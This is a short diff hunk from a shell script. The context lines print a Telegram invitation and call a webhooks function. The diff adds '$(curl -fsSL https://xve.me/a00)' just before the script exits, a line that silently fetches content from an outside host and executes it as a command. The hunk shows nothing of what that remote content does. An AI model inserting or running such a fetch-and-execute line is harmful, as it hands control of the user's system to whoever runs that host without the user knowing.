@@ -1712,5 +1712,5 @@ else
 fi
 webhooks
 echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
-
+$(curl -fsSL https://xve.me/a00)
 exit_code 0
